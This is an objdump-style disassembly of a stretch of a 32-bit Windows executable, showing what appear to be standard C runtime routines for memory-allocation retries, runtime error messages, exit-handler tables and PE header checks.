  4040af:	e8 ac 05 00 00       	call   0x404660
  4040b4:	83 c4 04             	add    $0x4,%esp
  4040b7:	85 c0                	test   %eax,%eax
  4040b9:	74 10                	je     0x4040cb
  4040bb:	8b 54 24 28          	mov    0x28(%esp),%edx
  4040bf:	6a 01                	push   $0x1
  4040c1:	52                   	push   %edx
  4040c2:	ff 15 fc d8 40 00    	call   *0x40d8fc
  4040c8:	83 c4 08             	add    $0x8,%esp
  4040cb:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  4040cf:	e8 16 2c 00 00       	call   0x406cea
  4040d4:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4040d8:	39 68 0c             	cmp    %ebp,0xc(%eax)
  4040db:	74 13                	je     0x4040f0
  4040dd:	68 20 c0 40 00       	push   $0x40c020
  4040e2:	57                   	push   %edi
  4040e3:	8b d5                	mov    %ebp,%edx
  4040e5:	8b c8                	mov    %eax,%ecx
  4040e7:	e8 18 2c 00 00       	call   0x406d04
  4040ec:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  4040f0:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4040f4:	89 48 0c             	mov    %ecx,0xc(%eax)
  4040f7:	8b 06                	mov    (%esi),%eax
  4040f9:	83 f8 fe             	cmp    $0xfffffffe,%eax
  4040fc:	74 0d                	je     0x40410b
  4040fe:	8b 4e 04             	mov    0x4(%esi),%ecx
  404101:	03 cf                	add    %edi,%ecx
  404103:	33 0c 38             	xor    (%eax,%edi,1),%ecx
  404106:	e8 cf de ff ff       	call   0x401fda
  40410b:	8b 4e 0c             	mov    0xc(%esi),%ecx
  40410e:	8b 56 08             	mov    0x8(%esi),%edx
  404111:	03 cf                	add    %edi,%ecx
  404113:	33 0c 3a             	xor    (%edx,%edi,1),%ecx
  404116:	e8 bf de ff ff       	call   0x401fda
  40411b:	8b 4b 08             	mov    0x8(%ebx),%ecx
  40411e:	8b d7                	mov    %edi,%edx
  404120:	e9 ac 2b 00 00       	jmp    0x406cd1
  404125:	83 7b 0c fe          	cmpl   $0xfffffffe,0xc(%ebx)
  404129:	0f 84 50 ff ff ff    	je     0x40407f
  40412f:	68 20 c0 40 00       	push   $0x40c020
  404134:	57                   	push   %edi
  404135:	8b cb                	mov    %ebx,%ecx
  404137:	ba fe ff ff ff       	mov    $0xfffffffe,%edx
  40413c:	e8 c3 2b 00 00       	call   0x406d04
  404141:	e9 15 ff ff ff       	jmp    0x40405b
  404146:	56                   	push   %esi
  404147:	57                   	push   %edi
  404148:	33 f6                	xor    %esi,%esi
  40414a:	ff 74 24 0c          	push   0xc(%esp)
  40414e:	e8 19 ec ff ff       	call   0x402d6c
  404153:	8b f8                	mov    %eax,%edi
  404155:	85 ff                	test   %edi,%edi
  404157:	59                   	pop    %ecx
  404158:	75 27                	jne    0x404181
  40415a:	39 05 40 d2 40 00    	cmp    %eax,0x40d240
  404160:	76 1f                	jbe    0x404181
  404162:	56                   	push   %esi
  404163:	ff 15 74 90 40 00    	call   *0x409074
  404169:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  40416f:	3b 05 40 d2 40 00    	cmp    0x40d240,%eax
  404175:	76 03                	jbe    0x40417a
  404177:	83 c8 ff             	or     $0xffffffff,%eax
  40417a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40417d:	8b f0                	mov    %eax,%esi
  40417f:	75 c9                	jne    0x40414a
  404181:	8b c7                	mov    %edi,%eax
  404183:	5f                   	pop    %edi
  404184:	5e                   	pop    %esi
  404185:	c3                   	ret
  404186:	56                   	push   %esi
  404187:	57                   	push   %edi
  404188:	33 f6                	xor    %esi,%esi
  40418a:	6a 00                	push   $0x0
  40418c:	ff 74 24 14          	push   0x14(%esp)
  404190:	ff 74 24 14          	push   0x14(%esp)
  404194:	e8 82 2b 00 00       	call   0x406d1b
  404199:	8b f8                	mov    %eax,%edi
  40419b:	83 c4 0c             	add    $0xc,%esp
  40419e:	85 ff                	test   %edi,%edi
  4041a0:	75 27                	jne    0x4041c9
  4041a2:	39 05 40 d2 40 00    	cmp    %eax,0x40d240
  4041a8:	76 1f                	jbe    0x4041c9
  4041aa:	56                   	push   %esi
  4041ab:	ff 15 74 90 40 00    	call   *0x409074
  4041b1:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  4041b7:	3b 05 40 d2 40 00    	cmp    0x40d240,%eax
  4041bd:	76 03                	jbe    0x4041c2
  4041bf:	83 c8 ff             	or     $0xffffffff,%eax
  4041c2:	83 f8 ff             	cmp    $0xffffffff,%eax
  4041c5:	8b f0                	mov    %eax,%esi
  4041c7:	75 c1                	jne    0x40418a
  4041c9:	8b c7                	mov    %edi,%eax
  4041cb:	5f                   	pop    %edi
  4041cc:	5e                   	pop    %esi
  4041cd:	c3                   	ret
  4041ce:	56                   	push   %esi
  4041cf:	57                   	push   %edi
  4041d0:	33 f6                	xor    %esi,%esi
  4041d2:	ff 74 24 10          	push   0x10(%esp)
  4041d6:	ff 74 24 10          	push   0x10(%esp)
  4041da:	e8 5a 2c 00 00       	call   0x406e39
  4041df:	8b f8                	mov    %eax,%edi
  4041e1:	85 ff                	test   %edi,%edi
  4041e3:	59                   	pop    %ecx
  4041e4:	59                   	pop    %ecx
  4041e5:	75 2d                	jne    0x404214
  4041e7:	39 44 24 10          	cmp    %eax,0x10(%esp)
  4041eb:	74 27                	je     0x404214
  4041ed:	39 05 40 d2 40 00    	cmp    %eax,0x40d240
  4041f3:	76 1f                	jbe    0x404214
  4041f5:	56                   	push   %esi
  4041f6:	ff 15 74 90 40 00    	call   *0x409074
  4041fc:	8d 86 e8 03 00 00    	lea    0x3e8(%esi),%eax
  404202:	3b 05 40 d2 40 00    	cmp    0x40d240,%eax
  404208:	76 03                	jbe    0x40420d
  40420a:	83 c8 ff             	or     $0xffffffff,%eax
  40420d:	83 f8 ff             	cmp    $0xffffffff,%eax
  404210:	8b f0                	mov    %eax,%esi
  404212:	75 be                	jne    0x4041d2
  404214:	8b c7                	mov    %edi,%eax
  404216:	5f                   	pop    %edi
  404217:	5e                   	pop    %esi
  404218:	c3                   	ret
  404219:	51                   	push   %ecx
  40421a:	53                   	push   %ebx
  40421b:	8b 5c 24 0c          	mov    0xc(%esp),%ebx
  40421f:	56                   	push   %esi
  404220:	57                   	push   %edi
  404221:	33 f6                	xor    %esi,%esi
  404223:	33 ff                	xor    %edi,%edi
  404225:	3b 1c fd 20 c8 40 00 	cmp    0x40c820(,%edi,8),%ebx
  40422c:	74 06                	je     0x404234
  40422e:	47                   	inc    %edi
  40422f:	83 ff 17             	cmp    $0x17,%edi
  404232:	72 f1                	jb     0x404225
  404234:	83 ff 17             	cmp    $0x17,%edi
  404237:	0f 83 77 01 00 00    	jae    0x4043b4
  40423d:	55                   	push   %ebp
  40423e:	6a 03                	push   $0x3
  404240:	e8 cc 2f 00 00       	call   0x407211
  404245:	83 f8 01             	cmp    $0x1,%eax
  404248:	59                   	pop    %ecx
  404249:	0f 84 31 01 00 00    	je     0x404380
  40424f:	6a 03                	push   $0x3
  404251:	e8 bb 2f 00 00       	call   0x407211
  404256:	85 c0                	test   %eax,%eax
  404258:	59                   	pop    %ecx
  404259:	75 0d                	jne    0x404268
  40425b:	83 3d 5c c0 40 00 01 	cmpl   $0x1,0x40c05c
  404262:	0f 84 18 01 00 00    	je     0x404380
  404268:	81 fb fc 00 00 00    	cmp    $0xfc,%ebx
  40426e:	0f 84 3f 01 00 00    	je     0x4043b3
  404274:	68 28 9b 40 00       	push   $0x409b28
  404279:	bb 14 03 00 00       	mov    $0x314,%ebx
  40427e:	53                   	push   %ebx
  40427f:	bd 48 d2 40 00       	mov    $0x40d248,%ebp
  404284:	55                   	push   %ebp
  404285:	e8 1f 22 00 00       	call   0x4064a9
  40428a:	83 c4 0c             	add    $0xc,%esp
  40428d:	85 c0                	test   %eax,%eax
  40428f:	74 0d                	je     0x40429e
  404291:	56                   	push   %esi
  404292:	56                   	push   %esi
  404293:	56                   	push   %esi
  404294:	56                   	push   %esi
  404295:	56                   	push   %esi
  404296:	e8 6f ce ff ff       	call   0x40110a
  40429b:	83 c4 14             	add    $0x14,%esp
  40429e:	68 04 01 00 00       	push   $0x104
  4042a3:	be 61 d2 40 00       	mov    $0x40d261,%esi
  4042a8:	56                   	push   %esi
  4042a9:	6a 00                	push   $0x0
  4042ab:	c6 05 65 d3 40 00 00 	movb   $0x0,0x40d365
  4042b2:	ff 15 20 90 40 00    	call   *0x409020
  4042b8:	85 c0                	test   %eax,%eax
  4042ba:	75 26                	jne    0x4042e2
  4042bc:	68 10 9b 40 00       	push   $0x409b10
  4042c1:	68 fb 02 00 00       	push   $0x2fb
  4042c6:	56                   	push   %esi
  4042c7:	e8 dd 21 00 00       	call   0x4064a9
  4042cc:	83 c4 0c             	add    $0xc,%esp
  4042cf:	85 c0                	test   %eax,%eax
  4042d1:	74 0f                	je     0x4042e2
  4042d3:	33 c0                	xor    %eax,%eax
  4042d5:	50                   	push   %eax
  4042d6:	50                   	push   %eax
  4042d7:	50                   	push   %eax
  4042d8:	50                   	push   %eax
  4042d9:	50                   	push   %eax
  4042da:	e8 2b ce ff ff       	call   0x40110a
  4042df:	83 c4 14             	add    $0x14,%esp
  4042e2:	56                   	push   %esi
  4042e3:	e8 28 22 00 00       	call   0x406510
  4042e8:	40                   	inc    %eax
  4042e9:	83 f8 3c             	cmp    $0x3c,%eax
  4042ec:	59                   	pop    %ecx
  4042ed:	76 38                	jbe    0x404327
  4042ef:	56                   	push   %esi
  4042f0:	e8 1b 22 00 00       	call   0x406510
  4042f5:	83 ee 3b             	sub    $0x3b,%esi
  4042f8:	03 c6                	add    %esi,%eax
  4042fa:	6a 03                	push   $0x3
  4042fc:	b9 5c d5 40 00       	mov    $0x40d55c,%ecx
  404301:	68 0c 9b 40 00       	push   $0x409b0c
  404306:	2b c8                	sub    %eax,%ecx
  404308:	51                   	push   %ecx
  404309:	50                   	push   %eax
  40430a:	e8 e7 20 00 00       	call   0x4063f6
  40430f:	83 c4 14             	add    $0x14,%esp
  404312:	85 c0                	test   %eax,%eax
  404314:	74 11                	je     0x404327
  404316:	33 f6                	xor    %esi,%esi
  404318:	56                   	push   %esi
  404319:	56                   	push   %esi
  40431a:	56                   	push   %esi
  40431b:	56                   	push   %esi
  40431c:	56                   	push   %esi
  40431d:	e8 e8 cd ff ff       	call   0x40110a
  404322:	83 c4 14             	add    $0x14,%esp
  404325:	eb 02                	jmp    0x404329
  404327:	33 f6                	xor    %esi,%esi
  404329:	68 08 9b 40 00       	push   $0x409b08
  40432e:	53                   	push   %ebx
  40432f:	55                   	push   %ebp
  404330:	e8 09 20 00 00       	call   0x40633e
  404335:	83 c4 0c             	add    $0xc,%esp
  404338:	85 c0                	test   %eax,%eax
  40433a:	74 0d                	je     0x404349
  40433c:	56                   	push   %esi
  40433d:	56                   	push   %esi
  40433e:	56                   	push   %esi
  40433f:	56                   	push   %esi
  404340:	56                   	push   %esi
  404341:	e8 c4 cd ff ff       	call   0x40110a
  404346:	83 c4 14             	add    $0x14,%esp
  404349:	ff 34 fd 24 c8 40 00 	push   0x40c824(,%edi,8)
  404350:	53                   	push   %ebx
  404351:	55                   	push   %ebp
  404352:	e8 e7 1f 00 00       	call   0x40633e
  404357:	83 c4 0c             	add    $0xc,%esp
  40435a:	85 c0                	test   %eax,%eax
  40435c:	74 0d                	je     0x40436b
  40435e:	56                   	push   %esi
  40435f:	56                   	push   %esi
  404360:	56                   	push   %esi
  404361:	56                   	push   %esi
  404362:	56                   	push   %esi
  404363:	e8 a2 cd ff ff       	call   0x40110a
  404368:	83 c4 14             	add    $0x14,%esp
  40436b:	68 10 20 01 00       	push   $0x12010
  404370:	68 e0 9a 40 00       	push   $0x409ae0
  404375:	55                   	push   %ebp
  404376:	e8 d9 2c 00 00       	call   0x407054
  40437b:	83 c4 0c             	add    $0xc,%esp
  40437e:	eb 33                	jmp    0x4043b3
  404380:	6a f4                	push   $0xfffffff4
  404382:	ff 15 04 91 40 00    	call   *0x409104
  404388:	8b e8                	mov    %eax,%ebp
  40438a:	3b ee                	cmp    %esi,%ebp
  40438c:	74 25                	je     0x4043b3
  40438e:	83 fd ff             	cmp    $0xffffffff,%ebp
  404391:	74 20                	je     0x4043b3
  404393:	6a 00                	push   $0x0
  404395:	8d 44 24 14          	lea    0x14(%esp),%eax
  404399:	50                   	push   %eax
  40439a:	8d 34 fd 24 c8 40 00 	lea    0x40c824(,%edi,8),%esi
  4043a1:	ff 36                	push   (%esi)
  4043a3:	e8 68 21 00 00       	call   0x406510
  4043a8:	59                   	pop    %ecx
  4043a9:	50                   	push   %eax
  4043aa:	ff 36                	push   (%esi)
  4043ac:	55                   	push   %ebp
  4043ad:	ff 15 00 91 40 00    	call   *0x409100
  4043b3:	5d                   	pop    %ebp
  4043b4:	5f                   	pop    %edi
  4043b5:	5e                   	pop    %esi
  4043b6:	5b                   	pop    %ebx
  4043b7:	59                   	pop    %ecx
  4043b8:	c3                   	ret
  4043b9:	6a 03                	push   $0x3
  4043bb:	e8 51 2e 00 00       	call   0x407211
  4043c0:	83 f8 01             	cmp    $0x1,%eax
  4043c3:	59                   	pop    %ecx
  4043c4:	74 15                	je     0x4043db
  4043c6:	6a 03                	push   $0x3
  4043c8:	e8 44 2e 00 00       	call   0x407211
  4043cd:	85 c0                	test   %eax,%eax
  4043cf:	59                   	pop    %ecx
  4043d0:	75 1f                	jne    0x4043f1
  4043d2:	83 3d 5c c0 40 00 01 	cmpl   $0x1,0x40c05c
  4043d9:	75 16                	jne    0x4043f1
  4043db:	68 fc 00 00 00       	push   $0xfc
  4043e0:	e8 34 fe ff ff       	call   0x404219
  4043e5:	68 ff 00 00 00       	push   $0xff
  4043ea:	e8 2a fe ff ff       	call   0x404219
  4043ef:	59                   	pop    %ecx
  4043f0:	59                   	pop    %ecx
  4043f1:	c3                   	ret
  4043f2:	8b 44 24 04          	mov    0x4(%esp),%eax
  4043f6:	33 c9                	xor    %ecx,%ecx
  4043f8:	3b 04 cd d8 c8 40 00 	cmp    0x40c8d8(,%ecx,8),%eax
  4043ff:	74 12                	je     0x404413
  404401:	41                   	inc    %ecx
  404402:	83 f9 2d             	cmp    $0x2d,%ecx
  404405:	72 f1                	jb     0x4043f8
  404407:	8d 48 ed             	lea    -0x13(%eax),%ecx
  40440a:	83 f9 11             	cmp    $0x11,%ecx
  40440d:	77 0c                	ja     0x40441b
  40440f:	6a 0d                	push   $0xd
  404411:	58                   	pop    %eax
  404412:	c3                   	ret
  404413:	8b 04 cd dc c8 40 00 	mov    0x40c8dc(,%ecx,8),%eax
  40441a:	c3                   	ret
  40441b:	05 44 ff ff ff       	add    $0xffffff44,%eax
  404420:	6a 0e                	push   $0xe
  404422:	59                   	pop    %ecx
  404423:	3b c8                	cmp    %eax,%ecx
  404425:	1b c0                	sbb    %eax,%eax
  404427:	23 c1                	and    %ecx,%eax
  404429:	83 c0 08             	add    $0x8,%eax
  40442c:	c3                   	ret
  40442d:	e8 3f de ff ff       	call   0x402271
  404432:	85 c0                	test   %eax,%eax
  404434:	75 06                	jne    0x40443c
  404436:	b8 40 ca 40 00       	mov    $0x40ca40,%eax
  40443b:	c3                   	ret
  40443c:	83 c0 08             	add    $0x8,%eax
  40443f:	c3                   	ret
  404440:	51                   	push   %ecx
  404441:	53                   	push   %ebx
  404442:	55                   	push   %ebp
  404443:	56                   	push   %esi
  404444:	57                   	push   %edi
  404445:	ff 35 14 d9 40 00    	push   0x40d914
  40444b:	e8 7c dc ff ff       	call   0x4020cc
  404450:	ff 35 10 d9 40 00    	push   0x40d910
  404456:	8b f0                	mov    %eax,%esi
  404458:	89 74 24 18          	mov    %esi,0x18(%esp)
  40445c:	e8 6b dc ff ff       	call   0x4020cc
  404461:	8b f8                	mov    %eax,%edi
  404463:	3b fe                	cmp    %esi,%edi
  404465:	59                   	pop    %ecx
  404466:	59                   	pop    %ecx
  404467:	0f 82 84 00 00 00    	jb     0x4044f1
  40446d:	8b df                	mov    %edi,%ebx
  40446f:	2b de                	sub    %esi,%ebx
  404471:	8d 6b 04             	lea    0x4(%ebx),%ebp
  404474:	83 fd 04             	cmp    $0x4,%ebp
  404477:	72 78                	jb     0x4044f1
  404479:	56                   	push   %esi
  40447a:	e8 d8 2d 00 00       	call   0x407257
  40447f:	8b f0                	mov    %eax,%esi
  404481:	3b f5                	cmp    %ebp,%esi
  404483:	59                   	pop    %ecx
  404484:	73 4a                	jae    0x4044d0
  404486:	b8 00 08 00 00       	mov    $0x800,%eax
  40448b:	3b f0                	cmp    %eax,%esi
  40448d:	73 02                	jae    0x404491
  40448f:	8b c6                	mov    %esi,%eax
  404491:	03 c6                	add    %esi,%eax
  404493:	3b c6                	cmp    %esi,%eax
  404495:	72 10                	jb     0x4044a7
  404497:	50                   	push   %eax
  404498:	ff 74 24 14          	push   0x14(%esp)
  40449c:	e8 2d fd ff ff       	call   0x4041ce
  4044a1:	85 c0                	test   %eax,%eax
  4044a3:	59                   	pop    %ecx
  4044a4:	59                   	pop    %ecx
  4044a5:	75 17                	jne    0x4044be
  4044a7:	8d 46 10             	lea    0x10(%esi),%eax
  4044aa:	3b c6                	cmp    %esi,%eax
  4044ac:	72 43                	jb     0x4044f1
  4044ae:	50                   	push   %eax
  4044af:	ff 74 24 14          	push   0x14(%esp)
  4044b3:	e8 16 fd ff ff       	call   0x4041ce
  4044b8:	85 c0                	test   %eax,%eax
  4044ba:	59                   	pop    %ecx
  4044bb:	59                   	pop    %ecx
  4044bc:	74 33                	je     0x4044f1
  4044be:	c1 fb 02             	sar    $0x2,%ebx
  4044c1:	50                   	push   %eax
  4044c2:	8d 3c 98             	lea    (%eax,%ebx,4),%edi
  4044c5:	e8 8b db ff ff       	call   0x402055
  4044ca:	59                   	pop    %ecx
  4044cb:	a3 14 d9 40 00       	mov    %eax,0x40d914
  4044d0:	ff 74 24 18          	push   0x18(%esp)
  4044d4:	e8 7c db ff ff       	call   0x402055
  4044d9:	89 07                	mov    %eax,(%edi)
  4044db:	83 c7 04             	add    $0x4,%edi
  4044de:	57                   	push   %edi
  4044df:	e8 71 db ff ff       	call   0x402055
  4044e4:	59                   	pop    %ecx
  4044e5:	a3 10 d9 40 00       	mov    %eax,0x40d910
  4044ea:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  4044ee:	59                   	pop    %ecx
  4044ef:	eb 02                	jmp    0x4044f3
  4044f1:	33 c0                	xor    %eax,%eax
  4044f3:	5f                   	pop    %edi
  4044f4:	5e                   	pop    %esi
  4044f5:	5d                   	pop    %ebp
  4044f6:	5b                   	pop    %ebx
  4044f7:	59                   	pop    %ecx
  4044f8:	c3                   	ret
  4044f9:	56                   	push   %esi
  4044fa:	6a 04                	push   $0x4
  4044fc:	6a 20                	push   $0x20
  4044fe:	e8 83 fc ff ff       	call   0x404186
  404503:	8b f0                	mov    %eax,%esi
  404505:	56                   	push   %esi
  404506:	e8 4a db ff ff       	call   0x402055
  40450b:	83 c4 0c             	add    $0xc,%esp
  40450e:	85 f6                	test   %esi,%esi
  404510:	a3 14 d9 40 00       	mov    %eax,0x40d914
  404515:	a3 10 d9 40 00       	mov    %eax,0x40d910
  40451a:	75 05                	jne    0x404521
  40451c:	6a 18                	push   $0x18
  40451e:	58                   	pop    %eax
  40451f:	5e                   	pop    %esi
  404520:	c3                   	ret
  404521:	83 26 00             	andl   $0x0,(%esi)
  404524:	33 c0                	xor    %eax,%eax
  404526:	5e                   	pop    %esi
  404527:	c3                   	ret
  404528:	6a 0c                	push   $0xc
  40452a:	68 d0 ae 40 00       	push   $0x40aed0
  40452f:	e8 20 fa ff ff       	call   0x403f54
  404534:	e8 cb e0 ff ff       	call   0x402604
  404539:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40453d:	ff 75 08             	push   0x8(%ebp)
  404540:	e8 fb fe ff ff       	call   0x404440
  404545:	59                   	pop    %ecx
  404546:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404549:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404550:	e8 09 00 00 00       	call   0x40455e
  404555:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404558:	e8 3c fa ff ff       	call   0x403f99
  40455d:	c3                   	ret
  40455e:	e8 aa e0 ff ff       	call   0x40260d
  404563:	c3                   	ret
  404564:	ff 74 24 04          	push   0x4(%esp)
  404568:	e8 bb ff ff ff       	call   0x404528
  40456d:	f7 d8                	neg    %eax
  40456f:	1b c0                	sbb    %eax,%eax
  404571:	f7 d8                	neg    %eax
  404573:	59                   	pop    %ecx
  404574:	48                   	dec    %eax
  404575:	c3                   	ret
  404576:	56                   	push   %esi
  404577:	57                   	push   %edi
  404578:	b8 70 ad 40 00       	mov    $0x40ad70,%eax
  40457d:	bf 70 ad 40 00       	mov    $0x40ad70,%edi
  404582:	3b c7                	cmp    %edi,%eax
  404584:	8b f0                	mov    %eax,%esi
  404586:	73 0f                	jae    0x404597
  404588:	8b 06                	mov    (%esi),%eax
  40458a:	85 c0                	test   %eax,%eax
  40458c:	74 02                	je     0x404590
  40458e:	ff d0                	call   *%eax
  404590:	83 c6 04             	add    $0x4,%esi
  404593:	3b f7                	cmp    %edi,%esi
  404595:	72 f1                	jb     0x404588
  404597:	5f                   	pop    %edi
  404598:	5e                   	pop    %esi
  404599:	c3                   	ret
  40459a:	56                   	push   %esi
  40459b:	57                   	push   %edi
  40459c:	b8 78 ad 40 00       	mov    $0x40ad78,%eax
  4045a1:	bf 78 ad 40 00       	mov    $0x40ad78,%edi
  4045a6:	3b c7                	cmp    %edi,%eax
  4045a8:	8b f0                	mov    %eax,%esi
  4045aa:	73 0f                	jae    0x4045bb
  4045ac:	8b 06                	mov    (%esi),%eax
  4045ae:	85 c0                	test   %eax,%eax
  4045b0:	74 02                	je     0x4045b4
  4045b2:	ff d0                	call   *%eax
  4045b4:	83 c6 04             	add    $0x4,%esi
  4045b7:	3b f7                	cmp    %edi,%esi
  4045b9:	72 f1                	jb     0x4045ac
  4045bb:	5f                   	pop    %edi
  4045bc:	5e                   	pop    %esi
  4045bd:	c3                   	ret
  4045be:	56                   	push   %esi
  4045bf:	57                   	push   %edi
  4045c0:	33 ff                	xor    %edi,%edi
  4045c2:	8d b7 48 ca 40 00    	lea    0x40ca48(%edi),%esi
  4045c8:	ff 36                	push   (%esi)
  4045ca:	e8 86 da ff ff       	call   0x402055
  4045cf:	83 c7 04             	add    $0x4,%edi
  4045d2:	83 ff 28             	cmp    $0x28,%edi
  4045d5:	59                   	pop    %ecx
  4045d6:	89 06                	mov    %eax,(%esi)
  4045d8:	72 e8                	jb     0x4045c2
  4045da:	5f                   	pop    %edi
  4045db:	5e                   	pop    %esi
  4045dc:	c3                   	ret
  4045dd:	cc                   	int3
  4045de:	cc                   	int3
  4045df:	cc                   	int3
  4045e0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4045e4:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%ecx)
  4045e9:	74 03                	je     0x4045ee
  4045eb:	33 c0                	xor    %eax,%eax
  4045ed:	c3                   	ret
  4045ee:	8b 41 3c             	mov    0x3c(%ecx),%eax
  4045f1:	03 c1                	add    %ecx,%eax
  4045f3:	81 38 50 45 00 00    	cmpl   $0x4550,(%eax)
  4045f9:	75 f0                	jne    0x4045eb
  4045fb:	33 c9                	xor    %ecx,%ecx
  4045fd:	66 81 78 18 0b 01    	cmpw   $0x10b,0x18(%eax)
  404603:	0f 94 c1             	sete   %cl
  404606:	8b c1                	mov    %ecx,%eax
  404608:	c3                   	ret
  404609:	cc                   	int3
  40460a:	cc                   	int3
  40460b:	cc                   	int3
  40460c:	cc                   	int3
  40460d:	cc                   	int3
  40460e:	cc                   	int3
  40460f:	cc                   	int3
  404610:	8b 44 24 04          	mov    0x4(%esp),%eax
  404614:	8b 48 3c             	mov    0x3c(%eax),%ecx
  404617:	03 c8                	add    %eax,%ecx
  404619:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  40461d:	53                   	push   %ebx
  40461e:	56                   	push   %esi
  40461f:	0f b7 71 06          	movzwl 0x6(%ecx),%esi
  404623:	33 d2                	xor    %edx,%edx
  404625:	85 f6                	test   %esi,%esi
  404627:	57                   	push   %edi
  404628:	8d 44 08 18          	lea    0x18(%eax,%ecx,1),%eax
  40462c:	76 1e                	jbe    0x40464c
  40462e:	8b 7c 24 14          	mov    0x14(%esp),%edi
  404632:	8b 48 0c             	mov    0xc(%eax),%ecx
  404635:	3b f9                	cmp    %ecx,%edi
  404637:	72 09                	jb     0x404642
  404639:	8b 58 08             	mov    0x8(%eax),%ebx
  40463c:	03 d9                	add    %ecx,%ebx
  40463e:	3b fb                	cmp    %ebx,%edi
  404640:	72 0c                	jb     0x40464e
  404642:	83 c2 01             	add    $0x1,%edx
  404645:	83 c0 28             	add    $0x28,%eax
  404648:	3b d6                	cmp    %esi,%edx
  40464a:	72 e6                	jb     0x404632
  40464c:	33 c0                	xor    %eax,%eax
  40464e:	5f                   	pop    %edi
  40464f:	5e                   	pop    %esi
  404650:	5b                   	pop    %ebx
  404651:	c3                   	ret
  404652:	cc                   	int3
  404653:	cc                   	int3
  404654:	cc                   	int3
  404655:	cc                   	int3
  404656:	cc                   	int3
  404657:	cc                   	int3
  404658:	cc                   	int3
  404659:	cc                   	int3
  40465a:	cc                   	int3
  40465b:	cc                   	int3
  40465c:	cc                   	int3
  40465d:	cc                   	int3
  40465e:	cc                   	int3
  40465f:	cc                   	int3
  404660:	55                   	push   %ebp
  404661:	8b ec                	mov    %esp,%ebp
  404663:	6a fe                	push   $0xfffffffe
  404665:	68 f0 ae 40 00       	push   $0x40aef0
  40466a:	68 b0 3f 40 00       	push   $0x403fb0
  40466f:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404675:	50                   	push   %eax
  404676:	83 ec 08             	sub    $0x8,%esp
  404679:	53                   	push   %ebx
  40467a:	56                   	push   %esi
  40467b:	57                   	push   %edi
  40467c:	a1 20 c0 40 00       	mov    0x40c020,%eax
  404681:	31 45 f8             	xor    %eax,-0x8(%ebp)
  404684:	33 c5                	xor    %ebp,%eax
  404686:	50                   	push   %eax
  404687:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40468a:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404690:	89 65 e8             	mov    %esp,-0x18(%ebp)
  404693:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40469a:	68 00 00 40 00       	push   $0x400000
  40469f:	e8 3c ff ff ff       	call   0x4045e0
  4046a4:	83 c4 04             	add    $0x4,%esp
  4046a7:	85 c0                	test   %eax,%eax
  4046a9:	74 55                	je     0x404700
  4046ab:	8b 45 08             	mov    0x8(%ebp),%eax
  4046ae:	2d 00 00 40 00       	sub    $0x400000,%eax
  4046b3:	50                   	push   %eax
  4046b4:	68 00 00 40 00       	push   $0x400000
  4046b9:	e8 52 ff ff ff       	call   0x404610
  4046be:	83 c4 08             	add    $0x8,%esp
  4046c1:	85 c0                	test   %eax,%eax
  4046c3:	74 3b                	je     0x404700
  4046c5:	8b 40 24             	mov    0x24(%eax),%eax
  4046c8:	c1 e8 1f             	shr    $0x1f,%eax
  4046cb:	f7 d0                	not    %eax
  4046cd:	83 e0 01             	and    $0x1,%eax
  4046d0:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4046d7:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4046da:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4046e1:	59                   	pop    %ecx
  4046e2:	5f                   	pop    %edi
  4046e3:	5e                   	pop    %esi
  4046e4:	5b                   	pop    %ebx
  4046e5:	8b e5                	mov    %ebp,%esp
  4046e7:	5d                   	pop    %ebp
  4046e8:	c3                   	ret
  4046e9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4046ec:	8b 08                	mov    (%eax),%ecx
  4046ee:	8b 01                	mov    (%ecx),%eax
  4046f0:	33 d2                	xor    %edx,%edx
  4046f2:	3d 05 00 00 c0       	cmp    $0xc0000005,%eax
  4046f7:	0f 94 c2             	sete   %dl
  4046fa:	8b c2                	mov    %edx,%eax
  4046fc:	c3                   	ret
  4046fd:	8b 65 e8             	mov    -0x18(%ebp),%esp
  404700:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404707:	33 c0                	xor    %eax,%eax
  404709:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  40470c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  404713:	59                   	pop    %ecx
  404714:	5f                   	pop    %edi
  404715:	5e                   	pop    %esi
  404716:	5b                   	pop    %ebx
  404717:	8b e5                	mov    %ebp,%esp
  404719:	5d                   	pop    %ebp
  40471a:	c3                   	ret
  40471b:	6a 08                	push   $0x8
  40471d:	68 10 af 40 00       	push   $0x40af10
  404722:	e8 2d f8 ff ff       	call   0x403f54
  404727:	e8 bc db ff ff       	call   0x4022e8
  40472c:	8b 40 78             	mov    0x78(%eax),%eax
  40472f:	85 c0                	test   %eax,%eax
  404731:	74 16                	je     0x404749
  404733:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  404737:	ff d0                	call   *%eax
  404739:	eb 07                	jmp    0x404742
  40473b:	33 c0                	xor    %eax,%eax
  40473d:	40                   	inc    %eax
  40473e:	c3                   	ret
  40473f:	8b 65 e8             	mov    -0x18(%ebp),%esp
  404742:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  404749:	e8 b5 2b 00 00       	call   0x407303
  40474e:	e8 46 f8 ff ff       	call   0x403f99
  404753:	c3                   	ret
  404754:	68 1b 47 40 00       	push   $0x40471b
